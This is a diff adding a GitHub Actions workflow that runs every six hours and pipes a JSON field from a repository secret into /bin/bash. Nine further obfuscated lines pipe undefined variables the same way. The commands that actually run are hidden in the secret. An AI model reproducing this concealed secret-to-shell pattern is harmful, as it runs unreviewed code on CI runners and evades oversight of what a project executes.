@@ -1,0 +1,27 @@
+name: hantao19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hantao19871010
+        env:
+          tk7: ${{ secrets.tk7 }}
+        run: |
+          echo $tk7 | jq -r .apny298 | /bin/bash
+          echo $qr91227 | jq -r .jkzj41920 | /bin/bash
+          echo $qrb2 | jq -r .dlswc1883 | /bin/bash
+          echo $ohn3 | jq -r .nhov4377 | /bin/bash
+          echo $ltql088 | jq -r .tp7 | /bin/bash
+          echo $o89903 | jq -r .cmyk115 | /bin/bash
+          echo $vcmw2 | jq -r .gumw8324 | /bin/bash
+          echo $axw60818 | jq -r .tl745 | /bin/bash
+          echo $mh1591 | jq -r .g0 | /bin/bash
+          echo $p5317 | jq -r .j00196 | /bin/bash
+
